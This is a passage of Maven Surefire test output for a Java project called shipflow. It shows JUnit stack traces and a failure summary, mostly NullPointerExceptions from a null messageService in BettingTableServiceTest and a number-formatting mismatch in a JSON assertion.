	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.updateMyWorkLog(WorkLogService.java:286)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.lambda$updateMyWorkLog_WhenNotOwned_ShouldThrowException$1(MyWorkLogServiceTest.java:243)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.updateMyWorkLog_WhenNotOwned_ShouldThrowException(MyWorkLogServiceTest.java:243)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.updateMyWorkLog_WhenNotOwned_ShouldThrowException(MyWorkLogServiceTest.java:245)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] 
[INFO] Results:
[INFO] 
[ERROR] Failures: 
[ERROR]   CircuitBreakerControllerIntegrationTest$ResolveCircuitBreakerTests.shouldResolveCircuitBreaker:290 No value at JSON path "$.circuitBreakerReason"
[ERROR]   TaskDependencyControllerIntegrationTest.removeDependency_NotFound_ReturnsBadRequest:350 JSON path "$.message" expected:<Dependency not found with id: 99999> but was:<Dependency not found with id: 99,999>
[ERROR]   BettingTableServiceTest.assignPitchToSlot_WhenPitchAlreadyAssigned_ShouldThrowException:244 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "already assigned"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.lambda$assignPitchToSlot$18(BettingTableService.java:215)
	at java.base/java.util.Optional.ifPresent(Optional.java:178)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.assignPitchToSlot(BettingTableService.java:213)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$assignPitchToSlot_WhenPitchAlreadyAssigned_ShouldThrowException$5(BettingTableServiceTest.java:242)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchAlreadyAssigned_ShouldThrowException(BettingTableServiceTest.java:242)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   BettingTableServiceTest.assignPitchToSlot_WhenPitchTooLarge_ShouldThrowException:228 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "requires 14 days"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.validatePitchFits(BettingTableService.java:386)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.assignPitchToSlot(BettingTableService.java:220)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$assignPitchToSlot_WhenPitchTooLarge_ShouldThrowException$4(BettingTableServiceTest.java:226)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchTooLarge_ShouldThrowException(BettingTableServiceTest.java:226)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   BettingTableServiceTest.createSlot_WithDuplicatePosition_ShouldThrowException:192 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "already exists"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.lambda$createSlot$13(BettingTableService.java:143)
	at java.base/java.util.Optional.ifPresent(Optional.java:178)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.createSlot(BettingTableService.java:141)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$createSlot_WithDuplicatePosition_ShouldThrowException$2(BettingTableServiceTest.java:190)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.createSlot_WithDuplicatePosition_ShouldThrowException(BettingTableServiceTest.java:190)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
